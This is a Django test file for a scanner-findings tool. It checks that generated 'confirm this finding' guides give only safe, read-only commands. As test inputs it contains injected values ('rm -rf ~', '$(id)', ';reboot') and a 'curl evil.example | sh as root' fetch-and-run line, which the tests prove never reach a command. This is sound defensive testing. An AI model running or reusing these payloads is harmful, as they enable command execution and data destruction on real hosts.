"""Confirm it yourself for every finding kind (cveFeed.finding_confirm): a scanner finding by its source (OpenVAS, nuclei, WPScan, any other),
a hygiene finding by its check, an open route, and the fallback. Each guide fills in the finding's own validated host, port and URL, says what
the scanner reported, keeps text from the host, a feed or the AI review out of every command, and is never empty. The finding detail also says
whether an automatic check exists for the finding (``validation.automatic``), which the page turns into an honest sentence.

Anonymised: example.com and 192.0.2.0/24. The OpenVAS case is shaped like a real one: an OpenVAS PHP version check at QoD 30 on a host whose
banner names Apache on Red Hat, not PHP."""
import json
import re
import shlex
from unittest import mock
from urllib.parse import urlsplit

from django.contrib.auth.models import User
from django.test import SimpleTestCase, TestCase
from django.utils import timezone

from cveFeed import finding_confirm
from cveFeed.models import CVEEntry, CVEMatch, HygieneFinding, ProbeObservation, RouteAuth
from dashboard.models import Org, Project
from scanEngine.models import EngineType
from startScan.models import CveId, ScanHistory, Subdomain, Vulnerability
from targetApp.models import Domain

PHP_CVES = ('CVE-2024-11233', 'CVE-2024-11234', 'CVE-2024-11236', 'CVE-2024-8929', 'CVE-2024-8932')
PHP_NVT = 'PHP < 8.1.31, 8.2.x < 8.2.26, 8.3.x < 8.3.14 Multiple Vulnerabilities - Linux'
PHP_OID = '1.3.6.1.4.1.25623.1.0.153495'
RED_HAT_BANNER = 'Apache/2.4.37 (Red Hat Enterprise Linux) OpenSSL/1.1.1k'
PLACEHOLDERS = re.compile(r'<(TARGET|PORT|HOST|URL)>')


def commands(guide):
    out = [s['command'] for s in guide.get('steps', []) if s.get('command')]
    out += [c['command'] for section in guide.get('local', []) for c in section['commands']]
    if guide.get('template', {}).get('command'):
        out.append(guide['template']['command'])
    return out


def texts(guide, key):
    return [x.get('text') or x.get('quote') or '' for x in guide.get(key, [])]


class Site:
    def __init__(self):
        now = timezone.now()
        self.user = User.objects.create_superuser('fc-admin', 'fc@example.com', 'x')
        org = Org.objects.create(name='o', slug='o')
        self.project = Project.objects.create(name='p', slug='fconfirm', insert_date=now, org=org)
        self.domain = Domain.objects.create(name='example.com', project=self.project, insert_date=now)
        engine = EngineType.objects.create(engine_name='e', yaml_configuration='')
        self.scan = ScanHistory.objects.create(domain=self.domain, scan_type=engine, scan_status=2, start_scan_date=now)

    def host(self, name, webserver=''):
        return Subdomain.objects.create(name=name, target_domain=self.domain, scan_history=self.scan, http_url=f'https://{name}', webserver=webserver)

    def vuln(self, sub, cves=(), **fields):
        fields.setdefault('severity', 2)
        vuln = Vulnerability.objects.create(target_domain=self.domain, scan_history=self.scan, subdomain=sub, discovered_date=timezone.now(), **fields)
        for cve in cves:
            vuln.cve_ids.add(CveId.objects.create(name=cve))
        return vuln

    def detail(self, kind, obj):
        from agentapi.services import Ctx, finding_detail
        return finding_detail(Ctx(self.user), self.project.slug, kind, obj.pk)


class OpenVasGuideTests(TestCase):
    def setUp(self):
        self.site = Site()
        self.sub = self.site.host('gecmedia.example.com', RED_HAT_BANNER)

    def php(self, **extra):
        fields = {'source': 'openvas', 'template_id': f'openvas:{PHP_OID}', 'type': 'openvas', 'name': f'OpenVAS: {PHP_NVT}',
                  'http_url': 'gecmedia.example.com:443/tcp', 'severity': 3,
                  'extracted_results': ['Installed version: 7.4.33\nFixed version:     8.1.31\nInstallation\npath / port:       443/tcp'],
                  'description': 'OpenVAS detection quality 30% (remote_banner_unreliable): a version or banner inference; the product may '
                                 'not be affected (for example a backported fix). Not confirmed.'}
        fields.update(extra)
        return self.site.vuln(self.sub, PHP_CVES, **fields)

    def test_a_low_qod_php_version_check_fills_in_the_host_says_it_was_inferred_and_gives_the_on_host_checks(self):
        guide = finding_confirm.scanner_guide(self.php())
        self.assertEqual(guide['class'], 'openvas')
        self.assertEqual(guide['headline'], 'Confirm PHP 7.4.33 on gecmedia.example.com:443')
        self.assertIn({'label': 'Host and port (as OpenVAS reported it)', 'text': 'gecmedia.example.com:443/tcp'}, guide['where'])
        look = ' '.join(texts(guide, 'look_for'))
        self.assertIn(PHP_OID, look)
        self.assertIn('installed 7.4.33 / fixed in 8.1.31, 8.2.26, 8.3.14', look)
        self.assertIn('QoD 30%, remote_banner_unreliable: OpenVAS inferred this version; it was not read from the service', look)
        self.assertIn(', '.join(PHP_CVES), look)
        # the remote step is a hint only, and reads the headers of the real host
        remote = guide['steps'][0]
        self.assertTrue(remote['title'].startswith('Hint only'))
        self.assertEqual(remote['command'], "curl -gsS -I --max-time 15 https://gecmedia.example.com/ | grep -i -E '^(server|x-powered-by):'")
        local = commands({'local': guide['local']})
        self.assertIn('php -v', local)
        self.assertIn('php -m', local)
        # the banner says Red Hat: rpm, with the changelog lines of every CVE; no dpkg
        self.assertIn("rpm -q --qf '%{NAME} %{VERSION}-%{RELEASE}\\n' php-common", local)
        self.assertIn('rpm -q --changelog php-common | grep -F ' + ' '.join(f'-e {c}' for c in PHP_CVES), local)
        self.assertFalse(any('dpkg' in c for c in local))
        urls = [link['url'] for link in guide['links']]
        self.assertEqual(urls[0], f'https://secinfo.greenbone.net/nvt/{PHP_OID}')
        for cve in PHP_CVES:
            self.assertIn(f'https://access.redhat.com/security/cve/{cve}', urls)
        hosts = {urlsplit(u).hostname for u in urls}
        self.assertFalse(hosts & {'ubuntu.com', 'security-tracker.debian.org', 'www.debian.org'})
        self.assertFalse(any(h.endswith(('.ubuntu.com', '.debian.org')) for h in hosts if h))
        verdict = guide['verdict']
        self.assertEqual(verdict['fixed'], '8.1.31, 8.2.26, 8.3.14')
        self.assertIn('backported fix', verdict['not_affected'])
        notes = ' '.join(verdict['notes'])
        self.assertIn('OpenVAS inferred this version; it was not read from the service', notes)
        self.assertIn('does not name PHP', notes)
        self.assertIn('upstream no longer fixes the 7.4 line', notes)
        self.assertIn('Red Hat', notes)
        self.assertIn('8.1.31 or later', guide['fix'])
        self.assertEqual(guide['fill'], {'TARGET': 'gecmedia.example.com', 'PORT': '443'})
        for command in commands(guide):
            shlex.split(command)
            self.assertNotRegex(command, PLACEHOLDERS)

    def test_the_stored_observation_adds_the_insight_and_its_qod_and_a_hard_qod_is_not_called_a_guess(self):
        ProbeObservation.objects.create(project=self.site.project, domain=self.site.domain, host='gecmedia.example.com', probe='openvas',
                                        kind='openvas', product=PHP_OID, port=443, source='openvas',
                                        evidence={'qod': 97, 'qod_type': 'package', 'insight': 'CVE-2024-8932: ldap_escape() integer overflow.',
                                                  'name': PHP_NVT})
        guide = finding_confirm.scanner_guide(self.php())
        look = ' '.join(texts(guide, 'look_for'))
        self.assertIn('ldap_escape() integer overflow', look)
        self.assertIn('QoD 97%, package: OpenVAS tested this itself', look)
        self.assertNotIn('inferred', ' '.join(guide['verdict']['notes']))

    def test_another_projects_observation_of_a_host_with_the_same_name_is_never_read(self):
        org = Org.objects.create(name='o2', slug='o2')
        other = Project.objects.create(name='p2', slug='other', insert_date=timezone.now(), org=org)
        domain = Domain.objects.create(name='example.com', project=other, insert_date=timezone.now())
        ProbeObservation.objects.create(project=other, domain=domain, host='gecmedia.example.com', probe='openvas', kind='openvas', product=PHP_OID,
                                        port=443, source='openvas', evidence={'qod': 99, 'qod_type': 'remote_vul', 'insight': 'OTHER ORG'})
        guide = finding_confirm.scanner_guide(self.php())
        self.assertNotIn('OTHER ORG', json.dumps(guide))
        self.assertIn('QoD 30%', ' '.join(texts(guide, 'look_for')))

    def test_a_hostile_location_never_reaches_a_command(self):
        guide = finding_confirm.scanner_guide(self.php(http_url="evil.example.com;rm -rf ~:443/tcp", name="OpenVAS: PHP < 8.1.31 $(id)"))
        dump = ' '.join(commands(guide))
        self.assertNotIn('rm -rf', dump)
        self.assertNotIn('$(id)', dump)
        self.assertNotIn('evil', dump)
        self.assertIn('gecmedia.example.com', dump)  # the finding's own host instead

    def test_an_openvas_result_of_an_unknown_product_still_says_where_and_what(self):
        vuln = self.site.vuln(self.sub, ('CVE-2023-0001',), source='openvas', template_id='openvas:1.3.6.1.4.1.25623.1.0.999999', type='openvas',
                              name='OpenVAS: Some Appliance Remote Code Execution', http_url='gecmedia.example.com:8443/tcp',
                              extracted_results=['Vulnerable endpoint answered'])
        guide = finding_confirm.scanner_guide(vuln)
        self.assertEqual(guide['headline'], 'Confirm the OpenVAS result on gecmedia.example.com:8443/tcp')
        self.assertIn('nmap -Pn -sV -p 8443 gecmedia.example.com', commands(guide))
        self.assertIn('Vulnerable endpoint answered', ' '.join(texts(guide, 'look_for')))
        self.assertIn('OpenVAS did not say how sure it is', ' '.join(texts(guide, 'look_for')))

    def test_the_finding_detail_carries_the_guide_and_says_no_automatic_check_exists(self):
        detail = self.site.detail('vulnerability', self.php())
        self.assertEqual(detail['confirm']['class'], 'openvas')
        self.assertEqual(detail['validation']['automatic']['check'], False)
        self.assertIsNone(detail['automatic_validation'])


REQUEST = ('GET /.git/config HTTP/1.1\r\nHost: app.example.com\r\nUser-Agent: Mozilla/5.0 (X11)\r\nAccept: */*\r\n'
           'Cookie: session=abc123secretcookie\r\nAuthorization: Bearer sk_live_51HxyzSECRETvalue000000\r\n\r\n')


class NucleiGuideTests(TestCase):
    def setUp(self):
        self.site = Site()
        self.sub = self.site.host('app.example.com')

    def git_config(self, **extra):
        fields = {'source': 'nuclei', 'template_id': 'git-config', 'template': 'http/exposures/configs/git-config.yaml', 'name': 'Git Config - Detect',
                  'http_url': 'https://app.example.com/.git/config', 'matcher_name': 'word', 'extracted_results': ['[core]'], 'request': REQUEST,
                  'response': 'HTTP/1.1 200 OK\r\n\r\n[core]\n\trepositoryformatversion = 0'}
        fields.update(extra)
        return self.site.vuln(self.sub, **fields)

    def test_the_template_its_link_the_matched_url_the_command_and_a_redacted_curl(self):
        guide = finding_confirm.scanner_guide(self.git_config())
        self.assertEqual(guide['class'], 'nuclei')
        self.assertIn({'label': 'Matched at', 'url': 'https://app.example.com/.git/config'}, guide['where'])
        step = guide['steps'][0]
        self.assertEqual(step['command'], "curl -gsS -i -H 'Accept: */*' --max-time 15 https://app.example.com/.git/config | head -c 4000")
        self.assertIn('Authorization, Cookie (left out here)', step['detail'])
        template = guide['template']
        self.assertEqual(template['template_url'], 'https://github.com/projectdiscovery/nuclei-templates/blob/main/http/exposures/configs/git-config.yaml')
        self.assertEqual(template['command'], 'nuclei -duc -ni -t http/exposures/configs/git-config.yaml -u https://app.example.com/.git/config')
        self.assertIn('Active check', template['active'])
        self.assertIn('plain read', template['active'])
        self.assertEqual(template['matcher'], 'word')
        self.assertEqual(template['extracted'], ['[core]'])
        self.assertIn('GET /.git/config HTTP/1.1', template['request'])
        self.assertIn('[redacted]', template['request'])
        dump = json.dumps(guide)
        self.assertNotIn('abc123secretcookie', dump)
        self.assertNotIn('sk_live_51HxyzSECRETvalue000000', dump)
        self.assertIn('matcher', guide['verdict']['affected'])

    def test_a_request_that_is_not_a_plain_read_becomes_no_command(self):
        guide = finding_confirm.scanner_guide(self.git_config(request='POST /api/login HTTP/1.1\r\nHost: app.example.com\r\n\r\nuser=admin&pass=x'))
        self.assertFalse(any(c.startswith('curl') for c in commands(guide)))
        self.assertIn('POST request with a body', ' '.join(guide['verdict']['notes']) + guide['steps'][0].get('detail', ''))
        self.assertIn('not a plain read', guide['template']['active'])

    def test_a_cvengine_written_template_has_no_public_link_and_no_command(self):
        guide = finding_confirm.scanner_guide(self.git_config(source='nuclei-cve', template_id='cve-2024-0001-cvengine', template=''))
        self.assertTrue(guide['template']['generated'])
        self.assertNotIn('command', guide['template'])
        self.assertNotIn('template_url', guide['template'])

    def test_an_unknown_template_path_falls_back_to_a_search_link_and_the_id(self):
        guide = finding_confirm.scanner_guide(self.git_config(template='/root/../etc/passwd', template_id='git-config'))
        self.assertEqual(guide['template']['template_search_url'], 'https://github.com/projectdiscovery/nuclei-templates/search?q=git-config')
        self.assertEqual(guide['template']['command'], 'nuclei -duc -ni -id git-config -u https://app.example.com/.git/config')


class WpscanGuideTests(TestCase):
    def setUp(self):
        self.site = Site()
        self.sub = self.site.host('blog.example.com')

    def test_a_plugin_finding_reads_the_readme_and_names_the_fixed_version(self):
        ProbeObservation.objects.create(project=self.site.project, domain=self.site.domain, host='blog.example.com', probe='wpscan-plugin',
                                        kind='wp-plugin', product='contact-form-7', version='5.3.1', source='wpscan',
                                        evidence={'found_by': 'Readme (Aggressive Detection)'})
        vuln = self.site.vuln(self.sub, ('CVE-2020-35489',), source='wpscan', template_id='wpscan:WordPress plugin contact-form-7', type='wpscan',
                              name='WordPress plugin contact-form-7 5.3.1: Unrestricted File Upload', http_url='https://blog.example.com/',
                              description='Fixed in 5.3.2. Remediation: update WordPress plugin contact-form-7 to 5.3.2 or later. Reported by the '
                                          'WordPress scan for WordPress plugin contact-form-7 5.3.1.')
        guide = finding_confirm.scanner_guide(vuln)
        self.assertEqual(guide['class'], 'wpscan')
        self.assertEqual(guide['headline'], 'Confirm the contact-form-7 plugin 5.3.1 on blog.example.com')
        readme = 'https://blog.example.com/wp-content/plugins/contact-form-7/readme.txt'
        self.assertIn({'label': "The plugin's readme.txt", 'url': readme}, guide['where'])
        self.assertIn(f"curl -gsS --max-time 15 {readme} | grep -i -m1 -E '^[[:space:]]*Stable tag:'", commands(guide))
        self.assertIn("wp plugin get contact-form-7 --fields=name,status,version", commands(guide))
        look = ' '.join(texts(guide, 'look_for'))
        self.assertIn('Stable tag: 5.3.1', look)
        self.assertIn('Readme (Aggressive Detection)', look)
        self.assertEqual(guide['verdict']['fixed'], '5.3.2')
        self.assertIn('5.3.2 or later', guide['verdict']['not_affected'])
        self.assertIn('5.3.2 or later', guide['fix'])

    def test_a_core_finding_reads_the_generator_tag(self):
        vuln = self.site.vuln(self.sub, source='wpscan', template_id='wpscan:WordPress', type='wpscan', name='WordPress 6.1.1: Some flaw',
                              http_url='https://blog.example.com/', description='Fixed in 6.1.2. Remediation: update WordPress.')
        guide = finding_confirm.scanner_guide(vuln)
        self.assertIn('wp core version', commands(guide))
        self.assertTrue(any('generator' in c for c in commands(guide)))
        self.assertEqual(guide['verdict']['fixed'], '6.1.2')

    def test_a_listing_finding_falls_back_to_the_generic_guide(self):
        vuln = self.site.vuln(self.sub, source='wpscan', template_id='wpscan:users', type='wpscan', name='WordPress usernames can be listed',
                              http_url='https://blog.example.com/')
        guide = finding_confirm.scanner_guide(vuln)
        self.assertEqual(guide['class'], 'scanner')
        self.assertIn('curl -gsS -i --max-time 15 https://blog.example.com/ | head -c 4000', commands(guide))


class GenericGuideTests(TestCase):
    def setUp(self):
        self.site = Site()
        self.sub = self.site.host('files.example.com')

    def test_another_source_says_where_and_what_and_shows_the_ai_advice_as_plain_steps(self):
        vuln = self.site.vuln(self.sub, source='nmap', template_id='ftp-anon', name='Anonymous FTP login allowed', http_url='ftp://192.0.2.5:21',
                              extracted_results=['230 Login successful.'])
        advice = [{'kind': 'nmap', 'note': 'Check whether anonymous login is still allowed on port 21.'},
                  {'kind': 'manual', 'note': 'Run $(curl evil.example | sh) as root'}, 'not a dict']
        guide = finding_confirm.scanner_guide(vuln, advice)
        self.assertEqual(guide['class'], 'scanner')
        self.assertIn({'label': 'Where it was found', 'text': 'ftp://192.0.2.5:21'}, guide['where'])
        self.assertIn('230 Login successful.', ' '.join(texts(guide, 'look_for')))
        self.assertEqual(commands(guide), ['nmap -Pn -sV -p 21 192.0.2.5'])
        advice_steps = [s for s in guide['steps'] if s['run_in'] == 'advice']
        self.assertEqual([s['title'] for s in advice_steps], ['Suggested by the AI review: a port check', 'Suggested by the AI review'])
        self.assertTrue(all('command' not in s for s in advice_steps))  # the model's words are never a command
        self.assertIn('$(curl evil.example | sh)', advice_steps[1]['detail'])

    def test_a_url_finding_fetches_the_page_and_a_hostile_url_is_not_used(self):
        vuln = self.site.vuln(self.sub, source='bbot', template_id='', name='Something', http_url='https://files.example.com/a?x=1')
        self.assertIn('curl -gsS -i --max-time 15 \'https://files.example.com/a?x=1\' | head -c 4000', commands(finding_confirm.scanner_guide(vuln)))
        vuln = self.site.vuln(self.sub, source='bbot', template_id='', name='Other', http_url="https://files.example.com/a';id;'")
        guide = finding_confirm.scanner_guide(vuln)
        self.assertNotIn(';id;', ' '.join(commands(guide)))
        self.assertTrue(guide['where'])  # still says where: the finding's own host

    def test_the_finding_page_never_shows_an_empty_guide(self):
        vuln = self.site.vuln(self.sub, source='nuclei', template_id='x', name='X', http_url='https://files.example.com/')
        with mock.patch.object(finding_confirm, 'scanner_guide', side_effect=RuntimeError('boom')):
            guide = self.site.detail('vulnerability', vuln)['confirm']
        self.assertEqual(guide['class'], 'finding')
        self.assertTrue(guide['where'] and guide['steps'])


class HygieneGuideTests(TestCase):
    def setUp(self):
        self.site = Site()

    def finding(self, check, host, evidence=None, title='t'):
        return HygieneFinding.objects.create(domain=self.site.domain, host=host, check_name=check, severity=2, title=title, evidence=evidence or {})

    def test_each_family_has_its_read_only_check(self):
        cases = {
            ('tls_expired', 'www.example.com:443'): 'openssl s_client -connect www.example.com:443 -servername www.example.com </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer',
            ('tls_self_signed', 'www.example.com:8443'): 'openssl s_client -connect www.example.com:8443 -servername www.example.com -showcerts',
            ('tls_legacy_protocol', '192.0.2.9:443'): 'openssl s_client -connect 192.0.2.9:443 -tls1_1',
            ('spf_allow_all', 'example.com'): 'dig +short TXT example.com',
            ('dmarc_missing', 'example.com'): 'dig +short TXT _dmarc.example.com',
            ('dkim_weak_key', 'k1._domainkey.example.com'): 'dig +short TXT k1._domainkey.example.com',
            ('caa_missing', 'example.com'): 'dig +short CAA example.com',
            ('mta_sts_missing', 'example.com'): 'dig +short TXT _mta-sts.example.com',
            ('hsts_missing', 'www.example.com'): "curl -gsS -I --max-time 15 https://www.example.com/ | grep -i '^strict-transport-security:'",
            ('cleartext_ftp', 'ftp.example.com'): "printf 'AUTH TLS\\r\\nQUIT\\r\\n' | nc -w 5 ftp.example.com 21",
            ('cleartext_telnet', 'sw.example.com'): 'nmap -Pn -sV -p 23 sw.example.com',
        }
        evidence = {'cleartext_ftp': {'port': 21, 'banner': '220 ProFTPD Server'}, 'cleartext_telnet': {'port': 23}, 'spf_allow_all': {'record': 'v=spf1 +all'}}
        for (check, host), expected in cases.items():
            guide = finding_confirm.hygiene_guide(self.finding(check, host, evidence.get(check)))
            self.assertTrue(any(c.startswith(expected) for c in commands(guide)), (check, commands(guide)))
            self.assertTrue(guide['where'] and guide['verdict']['affected'] and guide['verdict']['not_affected'], check)
            for command in commands(guide):
                shlex.split(command)
        guide = finding_confirm.hygiene_guide(self.finding('cleartext_ftp', 'ftp2.example.com', evidence['cleartext_ftp']))
        self.assertIn('220 ProFTPD Server', ' '.join(texts(guide, 'look_for')))
        self.assertIn('234', guide['steps'][0]['detail'])

    def test_a_hostile_host_builds_no_command_and_an_unknown_check_still_says_where(self):
        guide = finding_confirm.hygiene_guide(self.finding('spf_missing', 'example.com;reboot'))
        self.assertFalse(commands(guide))
        guide = finding_confirm.hygiene_guide(self.finding('ts_acl_allow_all', 'tailnet.example.com', {'note': 'x'}))
        self.assertTrue(guide['where'])

    def test_the_tls_audit_keeps_its_own_guide_and_other_hygiene_findings_get_one_on_the_page(self):
        f = self.finding('tlsa_heartbleed', 'www.example.com:443', {'source': 'testssl.sh', 'test': 'heartbleed', 'result': 'VULNERABLE'})
        self.assertEqual(self.site.detail('hygiene', f)['confirm']['class_label'], 'testssl.sh TLS audit')
        f = self.finding('spf_softfail', 'example.com', {'record': 'v=spf1 ~all'})
        detail = self.site.detail('hygiene', f)
        self.assertEqual(detail['confirm']['class'], 'hygiene')
        self.assertEqual(detail['validation']['automatic']['check'], False)


class RouteAndPlanTests(TestCase):
    def setUp(self):
        self.site = Site()

    def test_an_open_route_is_confirmed_with_an_anonymous_get(self):
        route = RouteAuth.objects.create(project=self.site.project, domain=self.site.domain, host='admin.example.com',
                                         url='https://admin.example.com/admin/', path='/admin/', auth_state='open', http_status=200)
        guide = self.site.detail('route', route)['confirm']
        self.assertEqual(guide['class'], 'route')
        self.assertIn('curl -gsS -i --max-time 15 https://admin.example.com/admin/ | head -c 4000', commands(guide))

    def test_the_plan_says_which_kinds_have_an_automatic_check(self):
        from agentapi.services import _automatic_plan
        from cveFeed.models import Triage
        sub = self.site.host('db.example.com')
        db = self.site.vuln(sub, source='db_exposure', template_id='db-exposure-redis', name='Redis open', http_url='192.0.2.7:6379')
        nuclei = self.site.vuln(sub, source='nuclei', template_id='x', name='X', http_url='https://db.example.com/')
        self.assertEqual(_automatic_plan('vulnerability', db, None), {'check': True, 'lane': '', 'why': 'it is not tracked for triage yet'})
        self.assertFalse(_automatic_plan('vulnerability', nuclei, None)['check'])
        cve = CVEEntry.objects.create(cve_id='CVE-2024-0001', title='t', published_at=timezone.now(), cvss=9.8)
        match = CVEMatch.objects.create(cve_entry=cve, subdomain=sub, source='host', matched_product='openssl', matched_version='1.0.1', confidence=0.9)
        row = Triage.objects.create(project=self.site.project, kind='cve_match', match=match, host='db.example.com')
        plan = _automatic_plan('match', match, row)
        self.assertEqual((plan['check'], plan['lane']), (True, ''))
        self.assertIn('inventory', plan['why'])


class CurlGlobbingTests(SimpleTestCase):
    def test_every_curl_this_module_renders_turns_globbing_off(self):
        from pathlib import Path
        text = (Path(__file__).resolve().parent.parent / 'cveFeed' / 'finding_confirm.py').read_text()
        found = list(re.finditer(r"""f?['"]curl (-[A-Za-z]+)""", text))
        self.assertTrue(found)
        for item in found:
            self.assertIn('g', item.group(1), text[item.start():item.start() + 60])
